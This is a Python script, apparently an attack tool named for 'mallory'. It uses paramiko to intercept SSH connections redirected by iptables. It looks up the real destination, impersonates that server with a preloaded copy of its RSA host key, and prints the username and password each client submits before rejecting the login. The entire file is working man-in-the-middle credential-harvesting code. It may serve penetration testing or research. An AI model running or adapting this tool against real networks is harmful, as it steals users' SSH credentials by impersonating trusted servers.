#!/usr/bin/env python

import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import struct

import paramiko
from paramiko.py3compat import b, u, decodebytes


# setup logging
#paramiko.util.log_to_file('mallory_server.log')

class RejectingServer(paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        print("""Auth attempt with user '%s' and password '%s'""" % (username, password))
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return 'password'


class Keyring:
	keys = {}

	def load_keyfile(self, filename):
		key = paramiko.RSAKey(filename=filename)
		fp = key.get_fingerprint()
		print('Read key ' + fmt_fp(u(hexlify(fp))) + ' from "' + filename +'"')
		self.keys[fp] = key

	def get_key(self, fp):
		if fp in self.keys:
			return self.keys[fp]
		else:
			return None

def fmt_fp(fp):
	n = 2
	tokens = [ fp[i:i+n] for i in xrange(0, len(fp), n) ]
	return ':'.join(tokens)

def get_server_fp(dst, dport):
	client = paramiko.SSHClient()
	# now connect
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((dst, dport))
	except Exception as e:
		print('*** Connect failed: ' + str(e))
		traceback.print_exc()
		raise
	t = paramiko.Transport(sock)
	try:
		t.start_client()
		key = t.get_remote_server_key()
		print('target fp: ' + fmt_fp(u(hexlify(key.get_fingerprint()))))
		return key.get_fingerprint()
	except paramiko.SSHException:
		print('*** SSH negotiation failed.')
		return None
	finally:
		t.close()
		sock.close()

def get_orig_dst(conn):
	SO_ORIGINAL_DST = 80
	sockaddr_in = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
	(proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
	dst = "%d.%d.%d.%d" % (a, b, c, d)
	print('Original destination was: %d.%d.%d.%d:%d' % (a, b, c, d, port))
	return (dst, port)

def handle_client(client):
	print('Incoming client connection connection!')
	(dst, dport) = get_orig_dst(client)
	fp = get_server_fp(dst, dport)

	key = keyring.get_key(fp)
	if key is None:
		print('Unable to handle connection')
		client.close()
		return

	try:
		t = paramiko.Transport(client)
		t.set_gss_host(socket.getfqdn(""))
		try:
			t.load_server_moduli()
		except:
			print('(Failed to load moduli -- gex will be unsupported.)')
			raise
		t.add_server_key(key)
		server = RejectingServer()
		try:
			t.start_server(server=server)
		except paramiko.SSHException:
			print('*** SSH negotiation failed.')
			raise

		# wait for auth
		chan = t.accept(20)
		if chan is None:
			print('*** No channel.')
			raise Exception("No connection")
		print('Authenticated!')

	except Exception as e:
		print('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
		traceback.print_exc()
	finally:
		t.close()
		client.close()

keyring = Keyring()
for filename in sys.argv[1:]:
	keyring.load_keyfile(filename)

# bind the listening socket for iptables REDIRECT
try:
	ipt_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ipt_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	ipt_sock.bind(('', 2200))
except Exception as e:
	print('*** Bind failed: ' + str(e))
	traceback.print_exc()
	sys.exit(1)

while (1):
	try:
		ipt_sock.listen(0)
		print('Listening for connection ...')
		client, addr = ipt_sock.accept()
		handle_client(client)
	except Exception as e:
		print('*** Listen/accept failed: ' + str(e))
		traceback.print_exc()
		sys.exit(1)
